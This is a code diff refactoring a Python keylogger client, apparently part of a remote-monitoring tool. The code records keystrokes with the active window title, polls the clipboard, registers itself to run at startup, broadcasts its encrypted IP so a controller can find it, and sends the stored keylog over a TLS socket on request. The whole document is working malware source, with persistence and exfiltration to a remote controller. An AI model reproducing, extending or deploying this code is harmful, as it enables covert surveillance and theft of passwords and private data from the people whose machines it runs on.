@@ -1,14 +1,13 @@
-from socket import *
+import socket
 from time import sleep
 from tempfile import NamedTemporaryFile
-from utils import *
-from constants import *
-import win32gui
-import win32clipboard
+import utils
+import constants
 import sys
 from getpass import getuser
 from os.path import realpath
 from os import environ
+import pyperclip
 from datetime import datetime
 from threading import Thread, Lock
 import ssl
@@ -22,11 +21,11 @@ def broadcast_myself():
     Repeatedly broadcasts the client so the controller will find it. All encrypted.
     """
     global BD_PORT, BD_INTERVAL, conn, cipher_rsa
-    BDs = socket(AF_INET, SOCK_DGRAM)
+    BDs = socket.socket(type=socket.SOCK_DGRAM)
     while True:
         if not connected:
-            BDs.setsockopt(SOL_SOCKET, SO_BROADCAST, 1)
-            localIP = gethostbyname(gethostname())
+            BDs.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
+            localIP = socket.gethostbyname(socket.gethostname())
             BDs.sendto(cipher_rsa.encrypt(localIP.encode()),
                        ("<broadcast>", BD_PORT))
         sleep(BD_INTERVAL)
@@ -37,28 +36,28 @@ def listen():
     """
     Listens for incoming connection by the serber and sends him the keylog when requested. All encrypted.
     """
-    global FILE_NAME, connected, file_handle, file_lock, text_buffer
-    listener = socket(AF_INET, SOCK_STREAM)
-    set_keepalive(listener)
-    listener.bind(("", HOST_PORT))
+    global FILE_NAME, connected, CERT_FILE, file_handle, file_lock, text_buffer
+    listener = socket.socket()
+    utils.set_keepalive(listener)
+    listener.bind(("", constants.HOST_PORT))
     listener.listen(1)
     while True:
         conn, _ = listener.accept()
         connected = True
         conn = ssl.wrap_socket(
-            sock=conn, ca_certs="cert.pem", cert_reqs=ssl.CERT_REQUIRED)
+            sock=conn, ca_certs=CERT_FILE, cert_reqs=ssl.CERT_REQUIRED)
         while True:
             try:
-                if recv_msg(conn) != "send file":
+                if utils.recv_msg(conn) != "send file":
                     continue
                 with file_lock:
                     file_handle.seek(0)
                     data = file_handle.read()
-                    send_msg(conn, data)
+                    utils.send_msg(conn, data)
                     file_handle.close()
                     file_handle = open(FILE_NAME, "w+")
                 write_to_file()
-            except (timeout, error):
+            except (socket.timeout, socket.error):
                 conn.close()
                 connected = False
                 break
@@ -103,7 +102,7 @@ def clipboard_listener():
     global text_buffer, CLIP_POLL_RATE
     last_clip = ""
     while True:
-        curr_clip = GetClipboard()
+        curr_clip = pyperclip.paste()
         if curr_clip != last_clip:
             text_buffer += header("START CLIPBOARD")
             text_buffer += curr_clip
@@ -120,10 +119,10 @@ def on_key_down(event):
     Args:
         event: keyboard ebent
     """
-    global last_win, file_lock, text_buffer, BANNED_BUTTONS, BANNED_UNICODES, __debug__
-    modifiers = get_modifiers()
-    curr_win = GetForegroundWindowTitle()
-    un_char = ToUnicode(event.scan_code)
+    global last_win, file_lock, text_buffer, BANNED_BUTTONS
+    modifiers = utils.get_modifiers()
+    curr_win = utils.get_foreground_window_title()
+    un_char = utils.SC_to_unicode(event.scan_code)
     unsided_name = event.name[event.name.find(" ")+1:]
     if __debug__:
         print("Modifiers", modifiers)
@@ -135,7 +134,7 @@ def on_key_down(event):
         last_win = curr_win
     if un_char and not modifiers["ctrl"]:
         text_buffer += un_char
-    elif not is_modifier(unsided_name) and unsided_name not in BANNED_BUTTONS:
+    elif not utils.is_modifier(unsided_name) and unsided_name not in BANNED_BUTTONS:
         text_buffer += "{%s}" % ("".join(
             [mod + "+" for mod in modifiers.keys() if modifiers[mod]]) + unsided_name).upper()
     write_to_file()
@@ -162,7 +161,7 @@ if __name__ == "__main__":
     last_win = ""
 
     if STARTUP:
-        register_startup(STARTUP_NAME, realpath(sys.argv[0]))
+        utils.register_startup(STARTUP_NAME, realpath(sys.argv[0]))
 
     public_key = RSA.import_key(open(CERT_FILE).read())
     cipher_rsa = PKCS1_OAEP.new(public_key)
